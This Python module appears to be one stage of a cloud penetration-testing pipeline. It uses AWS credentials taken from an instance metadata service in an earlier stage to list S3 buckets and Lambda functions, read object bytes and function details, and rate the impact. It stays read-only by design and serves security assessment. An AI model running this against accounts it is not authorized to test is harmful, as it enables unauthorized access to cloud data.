"""
Stage 5: Cloud Impact Assessment
- Stage 4에서 획득한 임시 자격증명으로 boto3 호출
- S3 / Lambda 접근 가능 범위 확인 (read/list 계열만, destructive 금지)

Input: Stage 4의 output (_raw_credentials 포함)
Output 규격:
{
  "principal": {"type": "IAMRole", "name": "..."},
  "cloud_impact": [
    {
      "service": "S3",
      "resource": "test-bucket",
      "permissions": ["ListBucket", "GetObject"],
      "impact": "read_access"
    },
    ...
  ],
  "overall_impact": "high" | "medium" | "low" | "none"
}
"""
try:
    import boto3
    from botocore.exceptions import ClientError, NoCredentialsError
    _BOTO3_AVAILABLE = True
except ImportError:
    _BOTO3_AVAILABLE = False


def run_cloud_impact(
    imds_result: dict,
    region: str = "ap-northeast-2",
    max_buckets_to_probe: int = 3,
    max_functions_to_probe: int = 3,
) -> dict:
    """탈취 자격증명으로 S3/Lambda 접근 범위 점검"""
    if not _BOTO3_AVAILABLE:
        return _no_impact("boto3 미설치")

    creds = imds_result.get("_raw_credentials")
    role_name = imds_result.get("iam_role", {}).get("role_name")

    if not creds or not imds_result.get("temporary_credentials", {}).get("exposed"):
        return _no_impact("자격증명 미노출")

    session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds.get("Token"),
        region_name=region,
    )

    cloud_impact = []
    cloud_impact.extend(_probe_s3(session, max_buckets_to_probe))
    cloud_impact.extend(_probe_lambda(session, max_functions_to_probe))

    overall = _overall_impact(cloud_impact)

    return {
        "principal": {"type": "IAMRole", "name": role_name},
        "cloud_impact": cloud_impact,
        "overall_impact": overall,
    }


def _probe_s3(session, max_buckets: int) -> list:
    """S3: list_buckets → 첫 몇 개 버킷에 list_objects_v2 시도"""
    results = []
    s3 = session.client("s3")

    try:
        resp = s3.list_buckets()
        buckets = [b["Name"] for b in resp.get("Buckets", [])]
    except (ClientError, NoCredentialsError) as e:
        return [{
            "service": "S3", "resource": "*",
            "permissions": [], "impact": "no_access",
            "error": _err_str(e),
        }]

    if not buckets:
        return [{
            "service": "S3", "resource": "*",
            "permissions": ["ListBuckets"], "impact": "enumeration_only",
        }]

    for bucket in buckets[:max_buckets]:
        perms = ["ListBuckets"]
        impact = "enumeration_only"
        try:
            s3.list_objects_v2(Bucket=bucket, MaxKeys=1)
            perms.append("ListBucket")
            impact = "read_access"
            # GetObject도 시도
            try:
                obj = s3.list_objects_v2(Bucket=bucket, MaxKeys=1).get("Contents", [])
                if obj:
                    s3.get_object(Bucket=bucket, Key=obj[0]["Key"], Range="bytes=0-0")
                    perms.append("GetObject")
                    impact = "read_access"
            except ClientError:
                pass
        except ClientError as e:
            if e.response["Error"]["Code"] == "AccessDenied":
                impact = "no_access"

        results.append({
            "service": "S3",
            "resource": bucket,
            "permissions": perms,
            "impact": impact,
        })

    return results


def _probe_lambda(session, max_funcs: int) -> list:
    """Lambda: list_functions → 첫 몇 개에 get_function 시도"""
    results = []
    lam = session.client("lambda")

    try:
        resp = lam.list_functions(MaxItems=max_funcs)
        funcs = [f["FunctionName"] for f in resp.get("Functions", [])]
    except (ClientError, NoCredentialsError) as e:
        return [{
            "service": "Lambda", "resource": "*",
            "permissions": [], "impact": "no_access",
            "error": _err_str(e),
        }]

    if not funcs:
        return [{
            "service": "Lambda", "resource": "*",
            "permissions": ["ListFunctions"], "impact": "enumeration_only",
        }]

    for fn in funcs:
        perms = ["ListFunctions"]
        impact = "enumeration_only"
        try:
            lam.get_function(FunctionName=fn)
            perms.append("GetFunction")
            impact = "information_disclosure"
        except ClientError:
            pass
        results.append({
            "service": "Lambda",
            "resource": fn,
            "permissions": perms,
            "impact": impact,
        })

    return results


def _overall_impact(impact_list: list) -> str:
    """대충 max로 산정. 정책 정해지면 여기 로직 수정."""
    if not impact_list:
        return "none"
    ranks = {
        "no_access": 0,
        "enumeration_only": 1,
        "information_disclosure": 2,
        "read_access": 3,
        "write_access": 4,
    }
    max_rank = max(ranks.get(item.get("impact", "no_access"), 0) for item in impact_list)
    return {
        0: "none", 1: "low", 2: "medium", 3: "high", 4: "critical"
    }[max_rank]


def _no_impact(reason: str) -> dict:
    return {
        "principal": {"type": "IAMRole", "name": None},
        "cloud_impact": [],
        "overall_impact": "none",
        "note": reason,
    }


def _err_str(e) -> str:
    if hasattr(e, "response"):
        return e.response.get("Error", {}).get("Code", str(e))
    return str(e)


if __name__ == "__main__":
    import json, sys
    imds = json.load(sys.stdin)
    print(json.dumps(run_cloud_impact(imds), indent=2, ensure_ascii=False))
